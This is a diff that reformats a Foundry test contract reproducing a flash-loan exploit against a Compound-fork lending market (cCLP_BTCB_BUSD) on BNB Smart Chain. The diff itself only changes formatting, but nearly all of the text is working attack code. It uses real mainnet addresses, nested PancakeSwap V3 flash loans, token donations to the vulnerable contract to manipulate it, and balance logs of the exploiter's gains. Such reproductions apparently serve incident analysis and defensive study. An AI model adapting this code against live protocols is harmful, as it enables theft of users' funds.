@@ -19,53 +19,32 @@ interface IcCLP_BTCB_BUSD is ICErc20Delegate {
 }
 
 contract ContractTest is Test {
-    ICErc20Delegate private constant cWBNB =
-        ICErc20Delegate(payable(0x860DF3e99f6223D695aB51b2FB9eaa92Fa903E8D));
-    ICErc20Delegate private constant cBUSD =
-        ICErc20Delegate(payable(0xca797539f004C0F9c206678338f820AC38466D4b));
-    ICErc20Delegate private constant cUSDT =
-        ICErc20Delegate(payable(0xBa5B37100538Cde248AAA4c92FB330fCf91F557C));
-    ICErc20Delegate private constant cUSDC =
-        ICErc20Delegate(payable(0x33e68c922d19D74ce845546a5c12A66ea31385c4));
-    ICErc20Delegate private constant cDAI =
-        ICErc20Delegate(payable(0x7D247295a6938587C581f5Bb8CBD98A72388E530));
-    ICErc20Delegate private constant cETH =
-        ICErc20Delegate(payable(0x11797D61fD4BfF9728113601782D4444503093d7));
-    ICErc20Delegate private constant cBTC =
-        ICErc20Delegate(payable(0x7140A671Da66C0BD411E3fc3B15C51C36dBB5cA3));
-    ICErc20Delegate private constant cFIL =
-        ICErc20Delegate(payable(0xf77ef89255Fb387C6ebA1557c615A8B31A518aa2));
+    ICErc20Delegate private constant cWBNB = ICErc20Delegate(payable(0x860DF3e99f6223D695aB51b2FB9eaa92Fa903E8D));
+    ICErc20Delegate private constant cBUSD = ICErc20Delegate(payable(0xca797539f004C0F9c206678338f820AC38466D4b));
+    ICErc20Delegate private constant cUSDT = ICErc20Delegate(payable(0xBa5B37100538Cde248AAA4c92FB330fCf91F557C));
+    ICErc20Delegate private constant cUSDC = ICErc20Delegate(payable(0x33e68c922d19D74ce845546a5c12A66ea31385c4));
+    ICErc20Delegate private constant cDAI = ICErc20Delegate(payable(0x7D247295a6938587C581f5Bb8CBD98A72388E530));
+    ICErc20Delegate private constant cETH = ICErc20Delegate(payable(0x11797D61fD4BfF9728113601782D4444503093d7));
+    ICErc20Delegate private constant cBTC = ICErc20Delegate(payable(0x7140A671Da66C0BD411E3fc3B15C51C36dBB5cA3));
+    ICErc20Delegate private constant cFIL = ICErc20Delegate(payable(0xf77ef89255Fb387C6ebA1557c615A8B31A518aa2));
     IcCLP_BTCB_BUSD private constant cCLP_BTCB_BUSD =
         IcCLP_BTCB_BUSD(payable(0x93790C641D029D1cBd779D87b88f67704B6A8F4C));
-    IERC20 private constant WBNB =
-        IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
-    IERC20 private constant PancakeSwapToken =
-        IERC20(0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82);
-    IERC20 private constant BTCB =
-        IERC20(0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c);
-    IERC20 private constant BUSD =
-        IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
-    IERC20 private constant BUSDT =
-        IERC20(0x55d398326f99059fF775485246999027B3197955);
-    IERC20 private constant ETHToken =
-        IERC20(0x2170Ed0880ac9A755fd29B2688956BD959F933F8);
-    IERC20 private constant USDC =
-        IERC20(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d);
-    IERC20 private constant DAI =
-        IERC20(0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3);
-    ICointroller private constant Comptroller =
-        ICointroller(0xFC518333F4bC56185BDd971a911fcE03dEe4fC8c);
-    Uni_Pair_V3 private constant BUSDT_BTCB =
-        Uni_Pair_V3(0x46Cf1cF8c69595804ba91dFdd8d6b960c9B0a7C4);
-    Uni_Pair_V3 private constant BUSDT_BUSD =
-        Uni_Pair_V3(0x4f3126d5DE26413AbDCF6948943FB9D0847d9818);
-    Uni_Pair_V2 private constant BTCB_BUSD =
-        Uni_Pair_V2(0xF45cd219aEF8618A92BAa7aD848364a158a24F33);
-    address private constant attackContract =
-        0x07e536F23a197F6FB76F42aD01ac2Bcdc3BF738E;
+    IERC20 private constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
+    IERC20 private constant PancakeSwapToken = IERC20(0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82);
+    IERC20 private constant BTCB = IERC20(0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c);
+    IERC20 private constant BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
+    IERC20 private constant BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
+    IERC20 private constant ETHToken = IERC20(0x2170Ed0880ac9A755fd29B2688956BD959F933F8);
+    IERC20 private constant USDC = IERC20(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d);
+    IERC20 private constant DAI = IERC20(0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3);
+    ICointroller private constant Comptroller = ICointroller(0xFC518333F4bC56185BDd971a911fcE03dEe4fC8c);
+    Uni_Pair_V3 private constant BUSDT_BTCB = Uni_Pair_V3(0x46Cf1cF8c69595804ba91dFdd8d6b960c9B0a7C4);
+    Uni_Pair_V3 private constant BUSDT_BUSD = Uni_Pair_V3(0x4f3126d5DE26413AbDCF6948943FB9D0847d9818);
+    Uni_Pair_V2 private constant BTCB_BUSD = Uni_Pair_V2(0xF45cd219aEF8618A92BAa7aD848364a158a24F33);
+    address private constant attackContract = 0x07e536F23a197F6FB76F42aD01ac2Bcdc3BF738E;
 
     function setUp() public {
-        vm.createSelectFork("bsc", 34806205);
+        vm.createSelectFork("bsc", 34_806_205);
         vm.label(address(cWBNB), "cWBNB");
         vm.label(address(cFIL), "cFIL");
         vm.label(address(cCLP_BTCB_BUSD), "cCLP_BTCB_BUSD");
@@ -92,59 +71,39 @@ contract ContractTest is Test {
         // in the first attack tx
 
         emit log_named_decimal_uint(
-            "Exploiter WBNB balance before attack",
-            WBNB.balanceOf(address(this)),
-            WBNB.decimals()
+            "Exploiter WBNB balance before attack", WBNB.balanceOf(address(this)), WBNB.decimals()
         );
 
         emit log_named_decimal_uint(
-            "Exploiter BUSD balance before attack",
-            BUSD.balanceOf(address(this)),
-            BUSD.decimals()
+            "Exploiter BUSD balance before attack", BUSD.balanceOf(address(this)), BUSD.decimals()
         );
 
         emit log_named_decimal_uint(
-            "Exploiter BUSDT balance before attack",
-            BUSDT.balanceOf(address(this)),
-            BUSDT.decimals()
+            "Exploiter BUSDT balance before attack", BUSDT.balanceOf(address(this)), BUSDT.decimals()
         );
 
         emit log_named_decimal_uint(
-            "Exploiter BTCB balance before attack",
-            BTCB.balanceOf(address(this)),
-            BTCB.decimals()
+            "Exploiter BTCB balance before attack", BTCB.balanceOf(address(this)), BTCB.decimals()
         );
 
         emit log_named_decimal_uint(
-            "Exploiter ETHToken balance before attack",
-            ETHToken.balanceOf(address(this)),
-            ETHToken.decimals()
+            "Exploiter ETHToken balance before attack", ETHToken.balanceOf(address(this)), ETHToken.decimals()
         );
 
         emit log_named_decimal_uint(
-            "Exploiter USDC balance before attack",
-            USDC.balanceOf(address(this)),
-            USDC.decimals()
+            "Exploiter USDC balance before attack", USDC.balanceOf(address(this)), USDC.decimals()
         );
 
-        emit log_named_decimal_uint(
-            "Exploiter DAI balance before attack",
-            DAI.balanceOf(address(this)),
-            DAI.decimals()
-        );
+        emit log_named_decimal_uint("Exploiter DAI balance before attack", DAI.balanceOf(address(this)), DAI.decimals());
 
-        emit log_string(
-            "-----------------------------------------------------"
+        emit log_string("-----------------------------------------------------");
+
+        emit log_named_uint(
+            "Total supply value in vulnerable contract after first attack tx", cCLP_BTCB_BUSD.totalSupply()
         );
 
         emit log_named_uint(
-            "Total supply value in vulnerable contract after first attack tx",
-            cCLP_BTCB_BUSD.totalSupply()
-        );
-
-        emit log_named_uint(
-            "Exploiter cCLP_BTCB_BUSD balance after first attack tx",
-            cCLP_BTCB_BUSD.balanceOf(attackContract)
+            "Exploiter cCLP_BTCB_BUSD balance after first attack tx", cCLP_BTCB_BUSD.balanceOf(attackContract)
         );
 
         // Transfer 2 tokens cCLP_BTCB_BUSD from attack contract to this contract.
@@ -152,77 +111,49 @@ contract ContractTest is Test {
         // This step is needed to withdraw underlying BTCB_BUSD tokens later
         vm.prank(attackContract);
         cCLP_BTCB_BUSD.approve(address(this), type(uint256).max);
-        cCLP_BTCB_BUSD.transferFrom(
-            attackContract,
-            address(this),
-            cCLP_BTCB_BUSD.balanceOf(attackContract)
-        );
+        cCLP_BTCB_BUSD.transferFrom(attackContract, address(this), cCLP_BTCB_BUSD.balanceOf(attackContract));
 
         BUSDT_BTCB.flash(address(this), 0, 11_900e15, "");
 
         emit log_named_decimal_uint(
-            "Exploiter WBNB balance after attack",
-            WBNB.balanceOf(address(this)),
-            WBNB.decimals()
+            "Exploiter WBNB balance after attack", WBNB.balanceOf(address(this)), WBNB.decimals()
         );
 
         emit log_named_decimal_uint(
-            "Exploiter BUSD balance after attack",
-            BUSD.balanceOf(address(this)),
-            BUSD.decimals()
+            "Exploiter BUSD balance after attack", BUSD.balanceOf(address(this)), BUSD.decimals()
         );
 
         emit log_named_decimal_uint(
-            "Exploiter BUSDT balance after attack",
-            BUSDT.balanceOf(address(this)),
-            BUSDT.decimals()
+            "Exploiter BUSDT balance after attack", BUSDT.balanceOf(address(this)), BUSDT.decimals()
         );
 
         emit log_named_decimal_uint(
-            "Exploiter BTCB balance after attack",
-            BTCB.balanceOf(address(this)),
-            BTCB.decimals()
+            "Exploiter BTCB balance after attack", BTCB.balanceOf(address(this)), BTCB.decimals()
         );
 
         emit log_named_decimal_uint(
-            "Exploiter ETHToken balance after attack",
-            ETHToken.balanceOf(address(this)),
-            ETHToken.decimals()
+            "Exploiter ETHToken balance after attack", ETHToken.balanceOf(address(this)), ETHToken.decimals()
         );
 
         emit log_named_decimal_uint(
-            "Exploiter USDC balance after attack",
-            USDC.balanceOf(address(this)),
-            USDC.decimals()
+            "Exploiter USDC balance after attack", USDC.balanceOf(address(this)), USDC.decimals()
         );
 
-        emit log_named_decimal_uint(
-            "Exploiter DAI balance after attack",
-            DAI.balanceOf(address(this)),
-            DAI.decimals()
-        );
+        emit log_named_decimal_uint("Exploiter DAI balance after attack", DAI.balanceOf(address(this)), DAI.decimals());
     }
 
-    function pancakeV3FlashCallback(
-        uint256 fee0,
-        uint256 fee1,
-        bytes calldata data
-    ) external {
+    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
         if (msg.sender == address(BUSDT_BTCB)) {
             BUSDT_BUSD.flash(address(this), 0, 500_000e18, "");
             BTCB.transfer(address(BUSDT_BTCB), 11_900e15 + fee1);
         } else if (msg.sender == address(BUSDT_BUSD)) {
             // Transfer token amounts to pair and next mint liquidity
-            (uint112 reserveBTCB, uint112 reserveBUSD, ) = BTCB_BUSD
-                .getReserves();
+            (uint112 reserveBTCB, uint112 reserveBUSD,) = BTCB_BUSD.getReserves();
             BTCB.transfer(address(BTCB_BUSD), (reserveBTCB * 115) / 100);
             BUSD.transfer(address(BTCB_BUSD), (reserveBUSD * 115) / 100);
             BTCB_BUSD.mint(address(this));
             // Transfer PancakeSwapToken to vulnerable contract
-            PancakeSwapToken.transfer(
-                address(cCLP_BTCB_BUSD),
-                PancakeSwapToken.balanceOf(address(this))
-            );
+            PancakeSwapToken.transfer(address(cCLP_BTCB_BUSD), PancakeSwapToken.balanceOf(address(this)));
 
             emit log_named_uint(
                 "Exploiter underlying BTCB_BUSD tokens balance before transfer to vulnerable contract",
@@ -230,10 +161,7 @@ contract ContractTest is Test {
             );
 
             // Transfer BTCB_BUSD to vulnerable contract
-            BTCB_BUSD.transfer(
-                address(cCLP_BTCB_BUSD),
-                BTCB_BUSD.balanceOf(address(this))
-            );
+            BTCB_BUSD.transfer(address(cCLP_BTCB_BUSD), BTCB_BUSD.balanceOf(address(this)));
 
             emit log_named_uint(
                 "Exploiter underlying BTCB_BUSD tokens balance after transfer to vulnerable contract",
@@ -274,13 +202,8 @@ contract ContractTest is Test {
                 "Exploiter underlying BTCB_BUSD tokens balance after withdraw from vulnerable contract",
                 BTCB_BUSD.balanceOf(address(this))
             );
-            emit log_string(
-                "-----------------------------------------------------"
-            );
-            BTCB_BUSD.transfer(
-                address(BTCB_BUSD),
-                BTCB_BUSD.balanceOf(address(this))
-            );
+            emit log_string("-----------------------------------------------------");
+            BTCB_BUSD.transfer(address(BTCB_BUSD), BTCB_BUSD.balanceOf(address(this)));
             BTCB_BUSD.burn(address(this));
             BUSD.transfer(address(BUSDT_BUSD), 500_000e18 + fee1);
         }
